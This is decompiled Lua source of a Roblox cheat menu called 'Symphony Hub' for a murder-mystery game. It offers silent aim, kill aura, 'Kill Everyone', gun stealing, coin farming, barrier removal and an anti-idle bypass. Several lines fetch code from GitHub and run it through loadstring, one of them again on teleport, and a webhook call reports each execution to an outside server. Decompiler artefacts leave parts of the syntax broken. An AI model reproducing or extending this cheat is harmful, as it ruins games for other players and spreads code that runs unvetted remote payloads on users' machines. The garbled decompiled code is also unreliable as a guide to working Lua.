            if r1_74 ~= r29_0.Name then
              r1_74 = r9_0:FindFirstChild("Normal")
              r1_74 = r1_74:FindFirstChild("GunDrop")
              if (r32_0.Position - r1_74.Position).magnitude <= 10 then
                firetouchinterest(r32_0, r1_74, 0)
                firetouchinterest(r32_0, r1_74, 1)
              end
            end
          end
        end
        task.wait(0.2)
      end
    end,
  })
  r80_0 = "AddButton"
  r80_0 = {
    Title = "Steal Gun",
    Callback = function()
      -- line: [0, 0] id: 140
      if not GetToyPath("SprayPaint") then
        r0_0:Notify({
          Title = "Symphony Hub",
          Content = "Hold up, Picasso! You need spray paint to use this feature!",
          Duration = 5,
        })
        return 
      end
      StealGun()
    end,
  }
  r77_0:[r80_0](r80_0)
  r80_0 = "AddToggle"
  r80_0 = "EnableAutoStealGun"
  r77_0:[r80_0](r80_0, {
    Title = "Auto Steal Gun",
    Default = r39_0.AutoStealGun,
    Callback = function(r0_165)
      -- line: [0, 0] id: 165
      if not GetToyPath("SprayPaint") and r0_165 then
        r0_0:Notify({
          Title = "Symphony Hub",
          Content = "Hold up, Picasso! You need spray paint to use this feature!",
          Duration = 5,
        })
        r66_0.EnableAutoStealGun:SetValue(false)
        return 
      end
      r39_0.AutoStealGun = r0_165
      if r39_0.AutoStealGun and r40_0.IsRoundStarted then
        StealGun()
      end
    end,
  })
  r80_0 = "AddSection"
  r80_0 = "Sheriff"
  r78_0 = r65_0.Combat:[r80_0](r80_0)
  r81_0 = "AddButton"
  r81_0 = {
    Title = "Shoot Murderer",
    Callback = function()
      -- line: [0, 0] id: 73
      if tostring(r40_0.Gameplay.Sheriff) ~= r29_0.Name then
        r0_0:Notify({
          Title = "Symphony Hub",
          Content = "Whoops! Only sheriff can access this feature. Better luck next time!",
          Duration = 5,
        })
        return 
      end
      ShootMurderer()
    end,
  }
  r78_0:[r81_0](r81_0)
  r81_0 = "AddToggle"
  r81_0 = "EnableSharpShooter"
  r78_0:[r81_0](r81_0, {
    Title = "Sharp Shooter",
    Default = r39_0.SharpShooter,
    Callback = function(r0_147)
      -- line: [0, 0] id: 147
      r39_0.SharpShooter = r0_147
    end,
  })
  r81_0 = "AddToggle"
  r81_0 = "EnableSheriffSilentAim"
  r78_0:[r81_0](r81_0, {
    Title = "Sheriff Silent Aim",
    Default = r39_0.SheriffSilentAim,
    Callback = function(r0_191)
      -- line: [0, 0] id: 191
      r39_0.SheriffSilentAim = r0_191
      while r39_0.SheriffSilentAim do
        local r1_191 = r39_0.SSAAccuracy
        if r1_191 == "Ping Based" then
          r1_191 = tostring(r40_0.Gameplay.Sheriff)
          if r1_191 == r29_0.Name then
            r40_0.Ping = r24_0.Network.ServerStatsItem["Data Ping"]:GetValue()
            r1_191 = r42_0.SilentAimDesc
            if r1_191 then
              r42_0.SilentAimDesc:SetValue(" Ping: " .. r40_0.Ping .. "\n Ping Difference: " .. r40_0.PingDifference .. "\n Current Multiplier: " .. r40_0.PredictValue)
            end
          end
        end
        task.wait(0.1)
      end
    end,
  })
  function BuildPingBased()
    -- line: [0, 0] id: 130
    r42_0.SilentAimDesc = r78_0:CreateParagraph("SilentAimInfoParagraph", {
      Title = "Silent Aim Information",
      Content = " Ping: " .. r40_0.Ping .. "\n Ping Difference: " .. r40_0.PingDifference .. "\n Current Multiplier: " .. r40_0.PredictValue,
    })
    r78_0:AddInput("DefaultPredictionInput", {
      Title = "Default Prediction",
      Default = r39_0.DefaultPrediction,
      Numeric = true,
      Finished = false,
      Callback = function(r0_133)
        -- line: [0, 0] id: 133
        r39_0.DefaultPrediction = r0_133
      end,
    })
    r78_0:AddInput("DefaultPingInput", {
      Title = "Default Ping",
      Description = "Put your average ping here.",
      Default = r39_0.DefaultPing,
      Numeric = true,
      Finished = false,
      Callback = function(r0_131)
        -- line: [0, 0] id: 131
        r39_0.DefaultPing = r0_131
      end,
    })
    r78_0:AddSlider("PingStepSlider", {
      Title = "Ping Step",
      Default = r39_0.PingStep,
      Min = 10,
      Max = 50,
      Rounding = 0.1,
      Callback = function(r0_134)
        -- line: [0, 0] id: 134
        r39_0.PingStep = r0_134
      end,
    })
    r78_0:AddSlider("PredictionMultiplierSlider", {
      Title = "Prediction Multiplier",
      Default = r39_0.PredictionMultiplier,
      Min = 1,
      Max = 3,
      Rounding = 1,
      Callback = function(r0_135)
        -- line: [0, 0] id: 135
        r39_0.PredictionMultiplier = r0_135
      end,
    })
    r78_0:AddInput("PredictionMultiplierCapInput", {
      Title = "Prediction Multiplier Cap",
      Default = r39_0.PredictionMultiplierCap,
      Numeric = true,
      Finished = false,
      Callback = function(r0_132)
        -- line: [0, 0] id: 132
        r39_0.PredictionMultiplierCap = r0_132
      end,
    })
  end
  function DestroyPingBased()
    -- line: [0, 0] id: 72
    if r42_0.SilentAimDesc then
      r42_0.SilentAimDesc:Destroy()
      r42_0.SilentAimDesc = nil
    end
    if r66_0.DefaultPredictionInput then
      r66_0.DefaultPredictionInput:Destroy()
      r66_0.DefaultPredictionInput = nil
    end
    if r66_0.DefaultPingInput then
      r66_0.DefaultPingInput:Destroy()
      r66_0.DefaultPingInput = nil
    end
    if r66_0.PingStepSlider then
      r66_0.PingStepSlider:Destroy()
      r66_0.PingStepSlider = nil
    end
    if r66_0.PredictionMultiplierSlider then
      r66_0.PredictionMultiplierSlider:Destroy()
      r66_0.PredictionMultiplierSlider = nil
    end
    if r66_0.PredictionMultiplierCapInput then
      r66_0.PredictionMultiplierCapInput:Destroy()
      r66_0.PredictionMultiplierCapInput = nil
    end
  end
  r81_0 = "AddDropdown"
  r81_0 = "SheriffSilentAimAccuracy"
  r78_0:[r81_0](r81_0, {
    Title = "Prediction",
    Values = {
      "Regular",
      "Dynamic",
      "Seismic",
      "Overflow",
      "Ping Based"
    },
    Multi = false,
    Default = r39_0.SSAAccuracy,
    Callback = function(r0_62)
      -- line: [0, 0] id: 62
      if (r0_62 == "Overflow" or r0_62 == "Ping Based") and not r40_0.IsPremium then
        r0_0:Notify({
          Title = "Symphony Hub",
          Content = "You need premium to use this feature, go in settings if you would like to buy it.",
          Duration = 5,
        })
        r66_0.SheriffSilentAimAccuracy:SetValue("Dynamic")
        return 
      end
      r39_0.SSAAccuracy = r0_62
      if r39_0.SSAAccuracy == "Ping Based" then
        BuildPingBased()
      else
        DestroyPingBased()
      end
    end,
  })
  if r39_0.SSAAccuracy == "Ping Based" then
    BuildPingBased()
  end
  r81_0 = "AddSection"
  r81_0 = "Murderer"
  r79_0 = r65_0.Combat:[r81_0](r81_0)
  r82_0 = "AddDropdown"
  r82_0 = "PlayersToKillList"
  r42_0.PlayersToKillList = r79_0:[r82_0](r82_0, {
    Title = "Players To Kill",
    Values = r39_0.PlayersList,
    Multi = true,
    Default = {
      nil
    },
    Callback = function(r0_35)
      -- line: [0, 0] id: 35
      if r39_0.UpdateMethod == "On Dropdown Change" and r42_0.UpdatePlayersToKillList then
        UpdatePlayerLists("On Dropdown Change", r42_0.PlayersToKillList)
        r42_0.UpdatePlayersToKillList = false
      end
      r39_0.PlayersToKill = {}
      for r4_35, r5_35 in next, r0_35, nil do
        table.insert(r39_0.PlayersToKill, r4_35)
      end
    end,
  })
  r82_0 = "AddButton"
  r82_0 = {
    Title = "Kill Players",
    Callback = function()
      -- line: [0, 0] id: 136
      if tostring(r40_0.Gameplay.Murderer) ~= r29_0.Name then
        r0_0:Notify({
          Title = "Symphony Hub",
          Content = "Whoops! Only murderer can access this feature. Better luck next time!",
          Duration = 5,
        })
        return 
      end
      KillSelectedPlayers(r39_0.PlayersToKill)
    end,
  }
  r79_0:[r82_0](r82_0)
  r82_0 = "AddButton"
  r82_0 = {
    Title = "Kill Sheriff",
    Callback = function()
      -- line: [0, 0] id: 124
      if tostring(r40_0.Gameplay.Murderer) ~= r29_0.Name then
        r0_0:Notify({
          Title = "Symphony Hub",
          Content = "Whoops! Only murderer can access this feature. Better luck next time!",
          Duration = 5,
        })
        return 
      end
      KillPlayer(tostring(r40_0.Gameplay.Sheriff), true)
    end,
  }
  r79_0:[r82_0](r82_0)
  r82_0 = "AddButton"
  r82_0 = {
    Title = "Kill Everyone",
    Callback = function()
      -- line: [0, 0] id: 54
      if tostring(r40_0.Gameplay.Murderer) ~= r29_0.Name then
        r0_0:Notify({
          Title = "Symphony Hub",
          Content = "Whoops! Only murderer can access this feature. Better luck next time!",
          Duration = 5,
        })
        return 
      end
      KillAll()
    end,
  }
  r79_0:[r82_0](r82_0)
  r82_0 = "AddToggle"
  r82_0 = "EnableAutoKillSheriff"
  r79_0:[r82_0](r82_0, {
    Title = "Auto Kill Sheriff",
    Default = r39_0.AutoKillSheriff,
    Callback = function(r0_103)
      -- line: [0, 0] id: 103
      r39_0.AutoKillSheriff = r0_103
      if r40_0.Gameplay.Sheriff and r39_0.AutoKillSheriff then
        KillPlayer(tostring(r40_0.Gameplay.Sheriff), true)
      end
    end,
  })
  r82_0 = "AddToggle"
  r82_0 = "EnableAutoKillEveryone"
  r79_0:[r82_0](r82_0, {
    Title = "Auto Kill Everyone",
    Default = r39_0.AutoKillEveryone,
    Callback = function(r0_144)
      -- line: [0, 0] id: 144
      r39_0.AutoKillEveryone = r0_144
      if r39_0.AutoKillEveryone and tostring(r40_0.Gameplay.Murderer) == r29_0.Name then
        KillAll()
      end
    end,
  })
  r82_0 = "AddSlider"
  r82_0 = "KillAuraRangeSlider"
  r79_0:[r82_0](r82_0, {
    Title = "Kill Aura Range",
    Default = r39_0.KillAuraRange,
    Min = 1,
    Max = 60,
    Rounding = 0.1,
    Callback = function(r0_25)
      -- line: [0, 0] id: 25
      r39_0.KillAuraRange = r0_25
    end,
  })
  r82_0 = "AddToggle"
  r82_0 = "EnableKillAura"
  r79_0:[r82_0](r82_0, {
    Title = "Kill Aura",
    Default = r39_0.KillAura,
    Callback = function(r0_119)
      -- line: [0, 0] id: 119
      r39_0.KillAura = r0_119
      while r39_0.KillAura do
        local r1_119 = tostring(r40_0.Gameplay.Murderer)
        if r1_119 == r29_0.Name then
          r1_119 = GetNearestPlayer(r39_0.KillAuraRange)
          if r1_119 and IsAlive(r1_119.Name) then
            KillPlayer(r1_119.Name, true)
          end
          task.wait(0.1)
        else
          break
        end
      end
    end,
  })
  r82_0 = "AddToggle"
  r82_0 = "KnifeSilentAimToggle"
  r79_0:[r82_0](r82_0, {
    Title = "Knife Silent Aim",
    Default = r39_0.KnifeSilentAim,
    Callback = function(r0_26)
      -- line: [0, 0] id: 26
      r39_0.KnifeSilentAim = r0_26
      while r39_0.KnifeSilentAim do
        local r1_26 = r40_0.IsRoundStarted
        if r1_26 then
          r1_26 = tostring(r40_0.Gameplay.Murderer)
          if r1_26 == r29_0.Name then
            r1_26 = GetEnemy("Closest")
            r62_0 = r1_26
          end
        end
        task.wait(0.2)
      end
    end,
  })
  r82_0 = "AddSection"
  r82_0 = "Skill"
  r80_0 = r65_0.Misc:[r82_0](r82_0)
  r83_0 = "AddToggle"
  r83_0 = "AutoFakeBombClutchToggle"
  r80_0:[r83_0](r83_0, {
    Title = "Auto Fake Bomb Clutch",
    Default = false,
    Callback = function(r0_86)
      -- line: [0, 0] id: 86
      if r0_86 and not GetToyPath("FakeBomb") then
        r0_0:Notify({
          Title = "�� Error",
          Content = "You need fake bomb to use this feature.",
          Duration = 5,
        })
        r66_0.AutoFakeBombClutchToggle:SetValue(false)
        return 
      end
      r39_0.AutoFakeBombClutch = r0_86
    end,
  })
  r83_0 = "AddButton"
  r83_0 = {
    Title = "Blurt Roles",
    Callback = function()
      -- line: [0, 0] id: 61
      if not r40_0.IsRoundStarted then
        r0_0:Notify({
          Title = "Symphony Hub",
          Content = "Uh oh! you need to wait for the round to start for this!",
          Duration = 5,
        })
        return 
      end
      SendChatMessage("The murderer is " .. tostring(r40_0.Gameplay.Murderer))
      SendChatMessage("The sheriff is " .. tostring(r40_0.Gameplay.Sheriff))
    end,
  }
  r80_0:[r83_0](r83_0)
  r83_0 = "AddToggle"
  r83_0 = "EnableAutoBlurtRoles"
  r80_0:[r83_0](r83_0, {
    Title = "Auto Blurt Roles",
    Default = r39_0.AutoBlurtRoles,
    Callback = function(r0_17)
      -- line: [0, 0] id: 17
      r39_0.AutoBlurtRoles = r0_17
      if r39_0.AutoBlurtRoles and r40_0.IsRoundStarted then
        SendChatMessage("The murderer is " .. tostring(r40_0.Gameplay.Murderer))
        SendChatMessage("The sheriff is " .. tostring(r40_0.Gameplay.Sheriff))
      end
    end,
  })
  r83_0 = "AddSection"
  r83_0 = "Optimization"
  r81_0 = r65_0.Misc:[r83_0](r83_0)
  r84_0 = "AddToggle"
  r84_0 = "EnableDestroyDisplay"
  r81_0:[r84_0](r84_0, {
    Title = "Destroy Display",
    Default = r39_0.DestroyDisplay,
    Callback = function(r0_64)
      -- line: [0, 0] id: 64
      r39_0.DestroyDisplay = r0_64
      if r39_0.DestroyDisplay then
        for r4_64, r5_64 in pairs(r9_0.PetContainer:GetChildren()) do
          r5_64:Destroy()
        end
        for r4_64, r5_64 in pairs(r9_0.WeaponDisplays:GetChildren()) do
          r5_64:Destroy()
        end
      end
    end,
  })
  r84_0 = "AddToggle"
  r84_0 = "EnableDestroyCoins"
  r81_0:[r84_0](r84_0, {
    Title = "Destroy Coins",
    Default = r39_0.DestroyCoins,
    Callback = function(r0_77)
      -- line: [0, 0] id: 77
      r39_0.DestroyCoins = r0_77
      if r39_0.DestroyCoins and r40_0.IsRoundStarted then
        for r4_77, r5_77 in pairs(r40_0.Map.CoinContainer:GetChildren()) do
          if r5_77:IsA("Part") and r5_77.Name == "Coin_Server" and r5_77:FindFirstChild("TouchInterest") then
            r5_77:Destroy()
          end
        end
      end
    end,
  })
  r84_0 = "AddToggle"
  r84_0 = "EnableDestroyDeadBody"
  r81_0:[r84_0](r84_0, {
    Title = "Destroy Dead Body",
    Default = r39_0.DestroyDeadBody,
    Callback = function(r0_176)
      -- line: [0, 0] id: 176
      r39_0.DestroyDeadBody = r0_176
      if r39_0.DestroyDeadBody and r40_0.IsRoundStarted then
        for r4_176, r5_176 in pairs(r9_0:GetChildren()) do
          if r5_176:IsA("Model") and r5_176.Name == "Raggy" then
            r5_176:Destroy()
          end
        end
      end
    end,
  })
  r84_0 = "AddToggle"
  r84_0 = "EnableDestroyBarriers"
  r81_0:[r84_0](r84_0, {
    Title = "Destroy Barriers",
    Default = r39_0.DestroyBarriers,
    Callback = function(r0_16)
      -- line: [0, 0] id: 16
      r39_0.DestroyBarriers = r0_16
      if r39_0.DestroyBarriers then
        for r4_16, r5_16 in pairs(r9_0:GetDescendants()) do
          if r5_16.Name == "GlitchProof" or r5_16.Name == "InvisWalls" then
            r5_16:Destroy()
          end
        end
      end
    end,
  })
  r84_0 = "AddSection"
  r84_0 = "Helper"
  r82_0 = r65_0.Farm:[r84_0](r84_0)
  r85_0 = "AddButton"
  r85_0 = {
    Title = "Execute Auto Farm",
    Description = "Fastest Auto Farm Script.",
    Callback = function()
      -- line: [0, 0] id: 37
      loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Lite"))()
    end,
  }
  r82_0:[r85_0](r85_0)
  r85_0 = "AddToggle"
  r85_0 = "EnableCoinAura"
  r82_0:[r85_0](r85_0, {
    Title = "Coin Aura",
    Default = r39_0.CoinAura,
    Callback = function(r0_126)
      -- line: [0, 0] id: 126
      r39_0.CoinAura = r0_126
      while r39_0.CoinAura do
        local r1_126 = r40_0.IsRoundStarted
        if r1_126 then
          pcall(function()
            -- line: [0, 0] id: 127
            for r3_127, r4_127 in ipairs(r40_0.Map.CoinContainer:GetChildren()) do
              if r4_127:IsA("Part") and r4_127.Name == "Coin_Server" and r4_127:FindFirstChild("TouchInterest") then
                local r5_127 = r4_127:GetAttribute("CoinID")
                if r5_127 == "Coin" and IsCoinBagFull() then
                  return 
                end
                if r5_127 == "Egg" and IsEggBagFull() then
                  return 
                end
                if (r4_127.Position - startPosition).Magnitude <= 10 then
                  firetouchinterest(r32_0, r4_127, 0)
                  firetouchinterest(r32_0, r4_127, 1)
                end
              end
            end
          end)
          task.wait(0.2)
        else
          break
        end
      end
    end,
  })
  r85_0 = "AddSection"
  r85_0 = "Important"
  r83_0 = r65_0.Settings:[r85_0](r85_0)
  r86_0 = "CreateParagraph"
  r86_0 = "ScriptInfoParagraph"
  r42_0.ScriptInfoDesc = r83_0:[r86_0](r86_0, {
    Title = "Script Info",
    Content = "Premium: " .. tostring(r40_0.IsPremium) .. "\nContent Creator: No\nDiscord Server: discord.gg/symphonyhub\nMade by: Highlight Hub (discord.gg/mm2cheat)",
  })
  if not r40_0.IsPremium then
    r86_0 = "AddButton"
    r86_0 = {
      Title = "Buy Premium for 300 Robux.",
      Description = "Access all the premium features.",
      Callback = function()
        -- line: [0, 0] id: 18
        local r0_18, r1_18 = pcall(function()
          -- line: [0, 0] id: 19
          r21_0:PromptGamePassPurchase(r29_0, 140358979)
        end)
        if not r0_18 then
          r37_0("https://www.roblox.com/game-pass/140358979/Symphony-Hub-Rewrite")
          r0_0:Notify({
            Title = "Symphony Hub",
            Content = "Messed up the callback, so I sneakily copied the link to your clipboard!",
            Duration = 5,
          })
        end
      end,
    }
    r83_0:[r86_0](r86_0)
  end
  r86_0 = "AddSection"
  r86_0 = "Other"
  r84_0 = r65_0.Settings:[r86_0](r86_0)
  local r87_0 = "AddToggle"
  r87_0 = "Disable3DRenderingToggle"
  r84_0:[r87_0](r87_0, {
    Title = "Disable 3D Rendering",
    Default = false,
    Callback = function(r0_30)
      -- line: [0, 0] id: 30
      r39_0.Disable3DRendering = r0_30
      r15_0:Set3dRenderingEnabled(not r39_0.Disable3DRendering)
    end,
  })
  r87_0 = "AddSection"
  r87_0 = "Whitelist"
  r85_0 = r65_0.Settings:[r87_0](r87_0)
  local r88_0 = "AddDropdown"
  r88_0 = "WhitelistedPlayersList"
  r42_0.WhitelistedPlayersList = r85_0:[r88_0](r88_0, {
    Title = "Whitelisted Players",
    Values = r39_0.PlayersList,
    Multi = true,
    Default = {
      nil
    },
    Callback = function(r0_143)
      -- line: [0, 0] id: 143
      if r39_0.UpdateMethod == "On Dropdown Change" and r42_0.UpdateWhitelistedPlayersList then
        UpdatePlayerLists("On Dropdown Change", r42_0.WhitelistedPlayersList)
        r42_0.UpdateWhitelistedPlayersList = false
      end
      r39_0.WhitelistedPlayers = {}
      r39_0.ManualWhitelistedPlayers = {}
      for r4_143, r5_143 in next, r0_143, nil do
        table.insert(r39_0.WhitelistedPlayers, r4_143)
        table.insert(r39_0.ManualWhitelistedPlayers, r4_143)
      end
    end,
  })
  r88_0 = "AddToggle"
  r88_0 = "WhitelistFriendsToggle"
  r85_0:[r88_0](r88_0, {
    Title = "Whitelist Friends",
    Default = false,
    Callback = function(r0_166)
      -- line: [0, 0] id: 166
      r39_0.WhitelistFriends = r0_166
      if r39_0.WhitelistFriends then
        for r4_166, r5_166 in ipairs(r14_0:GetPlayers()) do
          if IsFriend(r5_166) then
            table.insert(r39_0.WhitelistedPlayers, r5_166.Name)
          end
        end
      else
        for r4_166, r5_166 in ipairs(r14_0:GetPlayers()) do
          if IsFriend(r5_166) and not table.find(r39_0.ManualWhitelistedPlayers, r5_166.Name) then
            r39_0.WhitelistedPlayers[r5_166.Name] = nil
          end
        end
      end
    end,
  })
  r88_0 = "AddToggle"
  r88_0 = "WhitelistMurdererToggle"
  r85_0:[r88_0](r88_0, {
    Title = "Whitelist Murderer",
    Default = false,
    Callback = function(r0_148)
      -- line: [0, 0] id: 148
      r39_0.WhitelistMurderer = r0_148
      if r39_0.WhitelistMurderer and r40_0.Gameplay.Murderer then
        table.insert(r39_0.WhitelistedPlayers, tostring(r40_0.Gameplay.Murderer))
      elseif not table.find(r39_0.ManualWhitelistedPlayers, tostring(r40_0.Gameplay.Murderer)) then
        r39_0.WhitelistedPlayers[tostring(r40_0.Gameplay.Murderer)] = nil
      end
    end,
  })
  r88_0 = "AddSection"
  r88_0 = "Player List"
  r86_0 = r65_0.Settings:[r88_0](r88_0)
  local r89_0 = "AddToggle"
  r89_0 = "DynamicUpdateMethodToggle"
  r86_0:[r89_0](r89_0, {
    Title = "Dynamic Update Method",
    Default = true,
    Callback = function(r0_97)
      -- line: [0, 0] id: 97
      r39_0.DynamicUpdateMethod = r0_97
      if r39_0.DynamicUpdateMethod and r42_0.UpdateMethodDropdown and r39_0.UpdateMethod ~= "On Player Event" then
        r42_0.UpdateMethodDropdown:SetValue("On Player Event")
      end
      -- warn: not visited block [4]
      -- block#4:
      -- _u2.UpdateMethodDropdown:SetValue("On Dropdown Change")
      -- goto label_39
    end,
  })
  r87_0 = "UpdateMethodDropdown"
  local r90_0 = "AddDropdown"
  r90_0 = "UpdateMethodDropdown"
  r42_0[r87_0] = r86_0:[r90_0](r90_0, {
    Title = "Update Method",
    Values = {
      "On Player Event",
      "On Dropdown Change"
    },
    Multi = false,
    Default = "On Player Event",
    Callback = function(r0_161)
      -- line: [0, 0] id: 161
      r39_0.UpdateMethod = r0_161
    end,
  })
  r89_0 = "AddSlider"
  r89_0 = "UpdatePlayerListDelaySlider"
  r86_0:[r89_0](r89_0, {
    Title = "Update Delay",
    Default = 0.1,
    Min = 0.1,
    Max = 10,
    Rounding = 1,
    Callback = function(r0_179)
      -- line: [0, 0] id: 179
      r39_0.AutoUpdateDelay = r0_179
    end,
  })
  r89_0 = "AddToggle"
  r89_0 = "AutoUpdatePlayerListToggle"
  r86_0:[r89_0](r89_0, {
    Title = "Auto Update Player List",
    Default = true,
    Callback = function(r0_189)
      -- line: [0, 0] id: 189
      r39_0.AutoUpdatePlayerList = r0_189
    end,
  })
  r89_0 = "AddButton"
  r89_0 = {
    Title = "Update Player List",
    Callback = function()
      -- line: [0, 0] id: 142
      UpdatePlayerLists("On Player Event")
    end,
  }
  r86_0:[r89_0](r89_0)
  -- close: r67_0
  r69_0 = "SetLibrary"
  r69_0 = r0_0
  r1_0:[r69_0](r69_0)
  r69_0 = "SetLibrary"
  r69_0 = r0_0
  r2_0:[r69_0](r69_0)
  r1_0:IgnoreThemeSettings()
  r69_0 = "SetIgnoreIndexes"
  r69_0 = {
    "TeleportToPlayerList",
    "SpectatePlayerList",
    "UpdateFlingPlayerList",
    "PlayersToKillList"
  }
  r1_0:[r69_0](r69_0)
  r69_0 = "SetFolder"
  r69_0 = "Symphony Hub"
  r2_0:[r69_0](r69_0)
  r69_0 = "SetFolder"
  r69_0 = "Symphony Hub/specific-game"
  r1_0:[r69_0](r69_0)
  r69_0 = "BuildInterfaceSection"
  r69_0 = r65_0.Settings
  r2_0:[r69_0](r69_0)
  r69_0 = "BuildConfigSection"
  r69_0 = r65_0.Settings
  r1_0:[r69_0](r69_0)
  r69_0 = "SelectTab"
  r69_0 = 1
  r64_0:[r69_0](r69_0)
  for r70_0, r71_0 in pairs(getconnections(r29_0.Idled)) do
    r74_0 = "Disable"
    r71_0:[r74_0]()
  end
  task.spawn(SendLogWebhook, "Execution")
  r0_0:Notify({
    Title = "Symphony Hub",
    Content = "The script\'s been loaded. Mission accomplished!",
    Duration = 3,
  })
  r67_0 = false
  r70_0 = "Connect"
  function r70_0(r0_8)
    -- line: [0, 0] id: 8
    if not r67_0 and r38_0 then
      r67_0 = true
      r38_0("loadstring(game:HttpGet(\'https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua\'))()")
    end
  end
  r29_0.OnTeleport:[r70_0](r70_0)
  r1_0:LoadAutoloadConfig()
  return 
else
  while true do
  end
  goto label_84	-- block#10 is visited secondly
end
